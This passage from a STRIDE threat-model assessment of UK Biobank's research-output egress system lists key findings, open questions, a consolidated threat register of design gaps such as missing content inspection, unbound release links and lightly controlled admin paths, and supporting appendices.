**Controls stated in the design documents:** AMS admin role and logged DynamoDB writes (T9); AVP group authorisation (T12); admin role gating with actions logged (T13); expiry claim defined, enforcement unspecified (T15); infrastructure access controls assumed (T19).

## 6. Key Findings

1. **Nothing inspects content — and until the Decision Engine arrives, that is the design.** Identity, transport, storage-immutability and authorisation controls are all specified. None of them looks inside the files. OCS goes live before the Decision Engine (a separate procurement) is integrated, so for that window, content checking is two human reviewers (T1, T3). The threat model's job is to make that window's exposure explicit so it can be consciously owned.
2. **The review judges the requester's own claims.** The metadata the two reviewers read is produced by the researcher's export app, with no server-side re-derivation shown in any document (T11, T5, T20). Combined with Finding 1: the sole interim disclosure control reads data supplied by the person it controls.
3. **The last control before data leaves is the least certain.** The documented release mechanism is a bearer link, while the requirement demands identity-binding (T7). This is the single sharpest point on the whole path.
4. **The privileged paths are lighter-controlled than the path they oversee.** Every ordinary transfer needs two people; re-pointing all transfers (T9), overriding a review (T13), or rewriting the authorisation rules (T19) each needs one. Self-approval is not structurally prevented (T12).
5. **The audit trail may not be able to prove who did what.** Optional capture, 90-day retention in one store, evidence spread across four stores, denied-transfer files not retained, and unconfirmed individual attribution (T10, T16, T4) all bear on the same promise: that everything which happened is provable afterwards. Whether the documented design satisfies the three-year requirement depends on that requirement's scope — confirmed in Section 7 as an open question before any formal risk is stated.
6. **The picture is more nuanced than "no controls."** Immutable quarantine staging before review, two independent approvals, group-based authorisation and logged admin writes all exist in the design and are genuine strengths. The gaps concentrate in four places: content inspection, requester-supplied inputs, the release step, and the admin paths. Saying so keeps this assessment honest and points the controls work at the right places.

## 7. Open Questions and Assumptions

### 7.1 Open questions to confirm with UK Biobank / the delivery team

| Open question | What it affects |
|---|---|
| Which sequencing is current: quarantine import before review (CD §5) or file copy after both approvals (UF §5; DS §§4–5)? The design documents contradict each other | The architecture in Section 2; what the reviews attest to; T16's retention exposure |
| Is the web-UI upload path into the quarantine bucket (DS §1) the current design, or a stale diagram? | T17; TB4's status as a control |
| Are approve/deny actions always recorded under a named individual's own account? | T4; the attribution half of the audit trail |
| How does the export app authenticate to the Export API? (An open question in its own design document; may have been defined in the last week) | T20; submission attribution |
| What is the scope of the three-year audit requirement — which records does it cover? | Whether T10 is stated as a formal risk, and its size |
| Is the documented retention lifecycle (14-day quarantine deletion; denied transfers not retained — DS §5) the intended design, given the retain-through-appeal requirements (FR-SEC-010/011)? | Whether T16 is stated as a formal risk |
| What data is sent to Zendesk per ticket, and who can access it there? | T14 |
| How is the release link generated — TTL, delivery, identity binding? | T7; the controls prescription for the release step |
| What are the IAM/S3/KMS access rules — which principals can reach the buckets, keys, database, workflow resume path and DataSync execution, and who can modify AVP policies? | T18, T19; the assurance stage overall |
| What are the design and timelines for Pre-DRTC and Post-DRTC processing? | T3, T8 |
| Token/session lifecycle: lifetime, refresh, revocation, logout? | T15 |

### 7.2 Assumptions

- The design documents in Appendix B reflect the system as intended; where they contradict each other, the contradiction is flagged above rather than silently resolved. Documents were captured as of 1 July 2026.
- Indicative priorities in Appendix A are analyst judgement to aid sequencing, pending validation with stakeholders. No formal likelihood/impact scoring has been applied at this stage; scoring follows at the risk stage, after the controls list and design assurance.
- OCS goes live before the Decision Engine is integrated; the interim reliance on manual review is treated as the plan of record.

## Appendix A. Consolidated Threat Register

| ID | STRIDE | Threat | Asset or boundary | Existing controls (stated) | Control gap or exposure | Indicative priority | Source |
|---|---|---|---|---|---|---|---|
| T1 | I | No automated check inspects file content before release; the automated-check hook has nothing connected to it | Research output files / whole egress path | Two-person metadata review | No content-level control until Decision Engine integration | High | CD §7; UF §§2–3 |
| T10 | R | Actions may be unprovable after the fact: optional capture, 90-day log store, evidence across four stores | Audit trail | CloudWatch/CloudTrail logging, fragmented | No single immutable authoritative record | High | HLA; DS §3 |
| T7 | S | Release is a pre-signed URL — works for whoever holds it; cannot satisfy identity-binding if sent directly | TB5 / release (flow 19) | TLS; time-limited link | No identity binding on the last control before egress | High | CD §6 |
| T11 | T | Reviewers judge file details produced by the researcher's own app | Transfer metadata / reviews | None server-side | Review inputs controlled by the requester | High | RAP; UF §§2–3 |
| T12 | E | Nothing prevents self-approval or one person giving both approvals | Review flows (12/14) | AVP group authorisation | No requester≠reviewer or reviewer-independence invariant | High | API §§2, 4 |
| T9 | E | One Storage Location change re-points destination and reviewers for every transfer using it | TB6 / Storage Location config | AMS admin role; write logged | No confirmation step or second person | High | UF §4; API §3 |
| T13 | E | Documented admin override of review decisions, no written limits | Review outcome | Admin role gating; actions logged | Override conditions, authorisation and logging undefined | High | REQ FR-SEC-018 |
| T19 | E | Nothing documents who can change the AVP policies that gate every permission | AVP policy store | Infrastructure access controls (assumed) | No change control or change log for authorisation rules | High | UF §4; API §3; CD §10 |
| T3 | I | Pre-DRTC scanning between export and transfer creation is design-in-progress | TB2 / ingest | None — "TBD" | Unscanned path into the reviewable flow | Medium | CD §3 |
| T15 | E | Token spec defines contents but not how sessions end (refresh, revocation, logout) | Identity tokens | `exp` claim defined | Stolen/stale token behaviour undefined | Medium | OIDC |
| T17 | T | Datastore design shows the web UI uploading directly into quarantine | TB4 / quarantine bucket | None confirmed | Possible user-facing write path into the holding area | Medium | DS §1; RAP |
| T16 | R | Denied-transfer evidence may not survive: retention deletes quarantined files at 14 days; denied transfers keep nothing | Quarantine / denied transfers | Object Lock (14-day) | Material for dispute, appeal or investigation not retained | Medium | DS §§3, 5 |
| T20 | S | Export app authentication to the Export API is an open question in its own design document | TB1 / flow 1 | Token/project validation at gateway | Submission not confidently tied to a named researcher | Medium | RAP; CD §2 |
| T18 | T | Workflow doesn't check approvals — a resume signal releases files; senders of that signal are unverified | P5/P6 / flow 16 | IAM (assumed, unverified) | Direct invocation = release with zero approvals | Medium | CD §5; HLA |
| T6 | D | Dev API internet-reachable behind an IP allow-list; DDoS baseline undecided | TB1 / ingress | IP allow-list (dev); ingress design in progress | Production baseline not yet agreed (NFR-SEC-007 "to discuss") | Medium | CD §1 |
| T8 | I | Post-DRTC processing (runs before any review) is design-in-progress | Post-DRTC / flow 9 | None — "TBD" | Undefined processing touching pre-review data | Medium | CD §8 |
| T4 | R | Approvals not confirmed to be recorded under named individual accounts | Review flows / audit | Decision recorded per transfer | Shared credential would defeat attribution | Medium | API §4; DS §2 |
| T14 | I | Zendesk receives egress request details; data scope and access unassessed | External ticketing | Zendesk controls (unverified) | Unmodelled external data flow | Medium | XHLA |
| T5 | T | Checksums generated in the researcher's app; no confirmed server-side re-check | File integrity | Client-side checksum | Integrity claim trusted from the requester | Low | RAP |

*Indicative priority is an analyst judgement to aid sequencing, not a validated risk rating. Formal likelihood/impact scoring follows at the risk stage.*

**Closed.** *T2 — an earlier draft assumed files only reached quarantine after both approvals, which would have meant reviewers approving files not yet staged. The component descriptions say otherwise: files are imported into quarantine first, reviewed there, and only the copy to the destination waits for approval (CD §5), satisfying FR-SEC-006 as intended. Closed as a non-issue; the sequencing contradiction with UF §5 / DS §§4–5 is carried in Section 7.*

## Appendix B. Source Documents

| Key | Document |
|---|---|
| UF | 03 - User Flows - Overview |
| API | 01 - API Information - Overview |
| DS | 04 - Datastores - Overview |
| CD | OCS / DRTC Architecture — Component Descriptions (Sections 1–10) |
| HLA | High-Level Architecture Overview |
| XHLA | Workflow — External High-Level Architecture |
| OIDC | AMS OIDC Token Specification |
| RAP | RAP Applet App Integration with OCS |
| REQ | OCS Security Requirements Agreement (NFR-SEC-001…014, FR-SEC-001…020) — ADO wiki |

## Appendix C. Glossary

| Term | Meaning |
|---|---|
| RAP | Research Analysis Platform — UK Biobank's research environment, built on DNAnexus |
| Applet | A small application that runs inside the DNAnexus platform; here, the export-request app running in the researcher's own RAP project |
| DRTC | The OCS transfer-control component: the API, workflow and stores that track a transfer through review |
| Quarantine zone | The storage area where exported files are held, immutably, while under review |
| Pre-signed URL | A time-limited download link that grants access to whoever holds it — it carries no check of the holder's identity |
| AMS | UK Biobank's Access Management System — the central login service; issues the identity tokens used across OCS |
| OIDC token | The signed pass issued at login (OpenID Connect): states who the user is, their groups, and when the pass expires |
| AVP | Amazon Verified Permissions — the policy engine that answers "is this person allowed to do this action?" for every request |
| DataSync | The AWS service that performs the actual file copies between storage locations |
| Step Functions | The AWS workflow engine orchestrating each transfer end to end |
| Trust boundary | A point in the system where the level of trust changes — where data or actions cross from one party's control to another's |
| STRIDE | The six threat categories used in this assessment: Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege |
| Five Safes | The framework for safe research data use: safe people, projects, settings, data and outputs — OCS implements the "safe outputs" check |
